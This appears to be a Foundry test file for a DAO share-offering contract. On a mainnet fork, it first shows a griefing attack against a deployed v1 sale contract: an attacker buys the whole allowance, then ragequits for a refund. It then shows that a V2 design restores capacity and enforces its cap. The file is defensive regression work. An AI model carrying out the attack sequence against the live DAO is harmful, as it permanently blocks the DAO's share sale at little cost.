// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test, console} from "../lib/forge-std/src/Test.sol";
import {ShareOffering} from "../src/dao/ShareOffering.sol";

interface IMolochX {
    function shares() external view returns (address);
    function allowance(address token, address spender) external view returns (uint256);
    function setAllowance(address spender, address token, uint256 amount) external;
    function ragequit(address[] calldata tokens, uint256 s, uint256 l) external;
}
interface IERC20X { function totalSupply() external view returns (uint256); function balanceOf(address) external view returns (uint256); }
interface IShareSaleV1 { function buy(address dao, uint256 amount) external payable; }

contract GriefTest is Test {
    address constant DAO = 0xD5dcE9BEE03e69362981afE48323A657fCceB8bE;
    address constant V1_ADDR = 0x0000000021ea5069B532CeE09058aB9e02EA60f9;
    uint256 constant PRICE = 333_000_000_000;

    IERC20X sh;
    address attacker = address(0xBAD5);

    function setUp() public {
        // foundry.toml pins fork_block_number long before this DAO existed, so under the
        // default profile there is nothing here to attack. Needs a fork at head:
        //   forge test --match-path test/ShareOffering.t.sol \
        //     --fork-url <archive> --fork-block-number $(cast block-number --rpc-url <archive>)
        if (DAO.code.length == 0) { vm.skip(true); return; }
        sh = IERC20X(IMolochX(DAO).shares());
    }

    function _toks() internal pure returns (address[] memory t) { t = new address[](1); t[0] = address(0); }

    /// TODAY: grant capacity, attacker buys it all and quits. Capacity is gone for good.
    function test_v1_griefKillsTheSale() public {
        uint256 grant = 1_000_000e18;
        vm.prank(DAO);
        IMolochX(DAO).setAllowance(V1_ADDR, DAO, grant);

        vm.deal(attacker, 10 ether);
        vm.prank(attacker);
        IShareSaleV1(V1_ADDR).buy{value: 1_000_000 * PRICE}(DAO, grant);
        uint256 bal = sh.balanceOf(attacker);
        uint256 before = attacker.balance;
        vm.prank(attacker);
        IMolochX(DAO).ragequit(_toks(), bal, 0);

        uint256 refunded = attacker.balance - before;
        console.log("granted            :", grant / 1e18);
        console.log("attacker bought    :", bal / 1e18);
        console.log("refunded to them   :", refunded);
        console.log("net cost to attack :", int256(1_000_000 * PRICE) - int256(refunded));
        console.log("allowance left     :", IMolochX(DAO).allowance(DAO, V1_ADDR));
        assertEq(IMolochX(DAO).allowance(DAO, V1_ADDR), 0, "v1 drained");
    }

    /// V2: same attack, capacity derived from live supply, so the burn gives it back.
    function test_v2_griefAchievesNothing() public {
        ShareOffering v2 = new ShareOffering();
        uint256 cap = sh.totalSupply() + 1_000_000e18;

        vm.startPrank(DAO);
        IMolochX(DAO).setAllowance(address(v2), DAO, type(uint256).max);
        v2.configure(DAO, address(0), PRICE, 0, cap);
        vm.stopPrank();
        console.log("remaining          :", v2.remaining(DAO) / 1e18);

        vm.deal(attacker, 10 ether);
        vm.prank(attacker);
        v2.buy{value: 1_000_000 * PRICE}(DAO, type(uint256).max);
        console.log("attacker bought    :", sh.balanceOf(attacker) / 1e18);
        console.log("remaining now      :", v2.remaining(DAO) / 1e18);
        assertEq(v2.remaining(DAO), 0, "should be sold out");

        uint256 bal = sh.balanceOf(attacker);
        vm.prank(attacker);
        IMolochX(DAO).ragequit(_toks(), bal, 0);
        console.log("remaining after RQ :", v2.remaining(DAO) / 1e18);
        assertEq(v2.remaining(DAO), 1_000_000e18, "capacity should heal");

        address buyer = address(0xB0B);
        vm.deal(buyer, 10 ether);
        vm.prank(buyer);
        v2.buy{value: 1_000_000 * PRICE}(DAO, 1_000_000e18);
        console.log("real buyer served  :", sh.balanceOf(buyer) / 1e18);
        assertEq(sh.balanceOf(buyer), 1_000_000e18, "buyer served");
    }

    /// The cap still binds, however much anyone pays.
    function test_v2_capHolds() public {
        ShareOffering v2 = new ShareOffering();
        uint256 cap = sh.totalSupply() + 100e18;
        vm.startPrank(DAO);
        IMolochX(DAO).setAllowance(address(v2), DAO, type(uint256).max);
        v2.configure(DAO, address(0), PRICE, 0, cap);
        vm.stopPrank();

        vm.deal(attacker, 100 ether);
        vm.prank(attacker);
        v2.buy{value: 10 ether}(DAO, type(uint256).max);
        console.log("minted (cap 100)   :", sh.balanceOf(attacker) / 1e18);
        assertEq(sh.balanceOf(attacker), 100e18, "cap honoured");

        vm.prank(attacker);
        (bool ok,) = address(v2).call{value: PRICE}(abi.encodeWithSignature("buy(address,uint256)", DAO, uint256(1e18)));
        console.log("one more share ok? :", ok);
        assertFalse(ok, "refuse past cap");
    }
}
